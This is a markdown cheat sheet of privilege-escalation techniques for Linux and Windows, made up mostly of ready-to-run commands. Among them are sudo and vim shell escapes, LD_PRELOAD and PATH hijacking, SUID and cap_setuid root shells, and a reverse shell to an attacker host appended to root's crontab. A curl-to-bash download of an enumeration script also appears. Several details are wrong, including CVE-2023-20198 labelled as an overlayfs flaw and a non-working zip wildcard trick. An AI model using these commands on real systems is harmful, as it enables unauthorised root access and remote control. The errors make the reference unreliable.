# 🔑 Privilege Escalation Techniques

> Methods to escalate from a standard user to admin/root.
> Post-exploitation phase — know your target before you escalate.

---

## Information Gathering for Privilege Escalation

### 1. System Information

```bash
uname -a
cat /etc/os-release
uname -r    # Kernel version — search for known exploits
```

### 2. Check Current User

```bash
id
groups
whoami
```

### 3. Sudo Privileges

```bash
sudo -l              # What can current user run as sudo?
sudo -l -U user      # Check a specific user
```

### 4. Find SUID/SGID Binaries

```bash
find / -perm -4000 2>/dev/null    # SUID binaries
find / -perm -2000 2>/dev/null    # SGID binaries
```

### 5. World-Writable Files

```bash
find / -perm -002 -type f 2>/dev/null
find / -perm -222 -type d 2>/dev/null
```

### 6. Installed Software

```bash
dpkg -l | grep -i 'version'
rpm -qa
```

---

## Sudo-Based Privilege Escalation

### 1. NOPASSWD Sudo

```bash
sudo -l
# If NOPASSWD commands are listed:
sudo /bin/bash
```

### 2. Sudo with Wildcards

```bash
# If sudo allows: /usr/bin/program *
sudo /usr/bin/program /etc/shadow
```

### 3. Command Substitution in Sudo

```bash
# If: sudo vim /etc/passwd
# Inside vim, run:
:!/bin/bash
```

### 4. LD_PRELOAD Injection

```bash
# If sudo preserves environment
sudo LD_PRELOAD=/tmp/evil.so /usr/bin/program
```

### 5. PATH Manipulation

```bash
echo '/bin/bash' > /tmp/sudo
export PATH=/tmp:$PATH
sudo sudo    # Runs our /tmp/sudo instead
```

---

## SUID Binary Exploitation

### 1. Find Exploitable SUID Binaries

```bash
find / -perm -4000 2>/dev/null
```

### 2. Common Vulnerable SUID Binaries

- `/usr/bin/passwd` (old versions)
- `/usr/bin/sudo` (old versions)
- `/bin/cp` (if writable location exists)
- Custom in-house applications

### 3. Check if Binary Is Vulnerable

```bash
strings /usr/bin/suid_binary | grep -i 'system\|exec\|sh'
ltrace /usr/bin/suid_binary
```

### 4. Exploit Example (cp command)

```bash
# If cp is SUID and a writable location exists:
cp /bin/bash /tmp/bash_copy
chmod u+s /tmp/bash_copy
/tmp/bash_copy -p    # Run with elevated privileges
```

---

## Kernel Vulnerability Exploitation

### 1. Check Kernel Version for Known CVEs

```bash
uname -r
# Search: https://www.cvedetails.com/
```

### 2. Find Kernel Exploits

```bash
searchsploit 'Linux Kernel' 5.10
```

### 3. Notable Kernel Exploits

| CVE | Name | Description |
|-----|------|-------------|
| CVE-2016-5195 | Dirty COW | Race condition in copy-on-write |
| CVE-2021-4034 | PwnKit | Polkit pkexec LPE |
| CVE-2023-20198 | Overlayfs | Filesystem privilege escalation |

### 4. Compile and Run an Exploit

```bash
gcc -o exploit exploit.c
./exploit
```

---

## Environment Variable Hijacking

### 1. LD_PRELOAD Injection

```bash
# Create a malicious shared library
gcc -shared -fPIC evil.c -o evil.so

# If sudo preserves LD_PRELOAD:
sudo LD_PRELOAD=./evil.so /usr/bin/program
```

### 2. LD_LIBRARY_PATH Hijacking

```bash
export LD_LIBRARY_PATH=/tmp:$LD_LIBRARY_PATH
# Place a fake library in /tmp
```

### 3. PATH Variable Manipulation

```bash
# If a program runs without a full path:
export PATH=/tmp:$PATH
# Place a fake binary in /tmp with the same name
```

---

## Cron Job Privilege Escalation

### 1. Find Cron Jobs

```bash
crontab -l           # Current user's cron jobs
sudo crontab -l      # Root cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
```

### 2. Writable Cron Script

```bash
# If cron runs a script you can write to:
echo '/bin/bash -i >& /dev/tcp/attacker/4444 0>&1' >> /var/spool/cron/crontabs/root
```

### 3. Wildcard Injection

```bash
# If cron runs: /usr/bin/zip -r backup *.sql
# In that directory, create a file named:
touch -- '-e sh shell.c'
# This causes zip to execute shell.c
```

---

## Linux Capabilities Escalation

### 1. Find Files with Capabilities

```bash
getcap -r / 2>/dev/null
```

### 2. Common Dangerous Capabilities

| Capability | Risk |
|-----------|------|
| `cap_setuid` | Can change UID to root |
| `cap_setgid` | Can change GID |
| `cap_sys_admin` | Near-root level access |

### 3. Exploit Example (Python with cap_setuid)

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

---

## Windows Privilege Escalation

### 1. Check Current User & Groups

```cmd
whoami
whoami /groups
net user
```

### 2. Find Unquoted Service Paths

```powershell
Get-WmiObject win32_service | where-object {$_.PathName -notlike "*\`"*"} | select Name,PathName
```

### 3. Kernel Exploit

```cmd
# Upload compiled exploit then run:
exploit.exe
```

### 4. Token Impersonation (Metasploit)

```
use exploit/windows/local/token_impersonation
```

---

## Automated Enumeration Tools

| Tool | Platform | Command |
|------|----------|---------|
| LinPEAS | Linux | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| bash` |
| WinPEAS | Windows | Download from [PEASS-ng releases](https://github.com/carlospolop/PEASS-ng/releases/) |
| GTFOBins | Linux | Check [gtfobins.github.io](https://gtfobins.github.io/) |
| LOLBAS | Windows | Check [lolbas-project.github.io](https://lolbas-project.github.io/) |

---

> 📝 Always document everything you find during an engagement.
